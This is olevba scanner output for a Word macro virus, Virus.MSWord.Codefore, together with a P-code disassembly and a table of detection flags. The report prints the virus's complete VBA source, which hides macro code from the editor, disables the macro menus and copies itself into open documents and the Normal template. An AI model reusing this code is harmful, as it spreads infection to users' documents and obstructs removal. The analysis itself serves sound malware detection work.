olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Codefore
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Codefore - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Randomize Timer
With System.Application.System.Application.Options.Application.System
.Application.Application.System.Application.Options.Application.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
.Application.Application.System.Application.Options.Application.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
End With

With Word.Application.Options.Application.CommandBars
.Item("Tools").Controls("Macro").Enabled = (False * False * False * False * False) * 0
.Item("Tools").Controls("Customize...").Enabled = (False * False * False * False * False) * 0
.Item("Tools").Controls("Templates and Add-Ins...").Enabled = (False * False * False * False * False) * 0
.Item("Format").Controls("Style...").Enabled = (False * False * False * False * False) * 0
End With

With ThisDocument.VBProject.VBComponents((False * False * False * False * False) + 1).CodeModule.Parent.CodeModule.Parent.CodeModule
cal = .Parent.CodeModule.Parent.CodeModule.Parent.CodeModule.Parent.CodeModule.CountOfLines
ACode = .Parent.CodeModule.Parent.CodeModule.Parent.CodeModule.lines((False * False * False * False * False) + 1, cal)
End With

With Word.Application.Options.Application.Documents(Int(Rnd * Word.Application.Options.Application.Documents.Count) + (False * False * False * False * False) + 1)
With .VBProject.VBComponents((False * False * False * False * False) + 1).CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule
cal = .Parent.CodeModule.CodePane.CodeModule.CountOfLines
.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.DeleteLines (False * False * False * False * False) + 1, cal
.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.InsertLines (False * False * False * False * False) + 1, ACode
End With
End With

With Word.Application.Templates.Application.ActiveDocument.Application.Options.Application.Templates.Application.Options.Application.Assistant.Application.Templates("NORMAL")
With .VBProject.VBComponents.VBE.VBProjects.VBE.VBProjects.VBE.VBProjects.Item("NORMAL").VBComponents.Item((False * False * False * False * False) + 1).CodeModule.CodePane.CodeModule.CodePane.CodeModule
cal = .CodePane.CodeModule.CodePane.CodeModule.CountOfLines
.Parent.CodeModule.CodePane.CodeModule.DeleteLines (False * False * False * False * False) + 1, cal
.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.InsertLines (False * False * False * False * False) + 1, ACode
End With
End With
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Codefore
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 12888 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #2:
' 	StartWithExpr 
' 	Ld System 
' 	MemLd Application 
' 	MemLd System 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd System 
' 	With 
' Line #3:
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeBackColors"
' 	MemLdWith Application 
' 	MemLd Application 
' 	MemLd System 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #4:
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeForeColors"
' 	MemLdWith Application 
' 	MemLd Application 
' 	MemLd System 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	EndWith 
' Line #6:
' Line #7:
' 	StartWithExpr 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd CommandBars 
' 	With 
' Line #8:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Mul 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #9:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Mul 
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Mul 
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #11:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0000 
' 	Mul 
' 	LitStr 0x0008 "Style..."
' 	LitStr 0x0006 "Format"
' 	ArgsMemLdWith Item 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	EndWith 
' Line #13:
' Line #14:
' 	StartWithExpr 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	With 
' Line #15:
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cal 
' Line #16:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld cal 
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St ACode 
' Line #17:
' 	EndWith 
' Line #18:
' Line #19:
' 	StartWithExpr 
' 	Ld Rnd 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	Mul 
' 	FnInt 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	ArgsMemLd Documents 0x0001 
' 	With 
' Line #20:
' 	StartWithExpr 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	With 
' Line #21:
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cal 
' Line #22:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld cal 
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #23:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ACode 
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	EndWith 
' Line #25:
' 	EndWith 
' Line #26:
' Line #27:
' 	StartWithExpr 
' 	LitStr 0x0006 "NORMAL"
' 	Ld Word 
' 	MemLd Application 
' 	MemLd Templates 
' 	MemLd Application 
' 	MemLd ActiveDocument 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd Templates 
' 	MemLd Application 
' 	MemLd Options 
' 	MemLd Application 
' 	MemLd Assistant 
' 	MemLd Application 
' 	ArgsMemLd Templates 0x0001 
' 	With 
' Line #28:
' 	StartWithExpr 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0006 "NORMAL"
' 	MemLdWith VBProject 
' 	MemLd VBComponents 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	MemLd VBE 
' 	MemLd VBProjects 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	With 
' Line #29:
' 	MemLdWith CodePane 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cal 
' Line #30:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld cal 
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #31:
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	LitVarSpecial (False)
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld ACode 
' 	MemLdWith Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	MemLd Parent 
' 	MemLd CodeModule 
' 	MemLd CodePane 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	EndWith 
' Line #33:
' 	EndWith 
' Line #34:
' 	EndSub 
' Line #35:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |VBComponents.VBE    |Executable file name                         |
|IOC       |VBProjects.VBE      |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

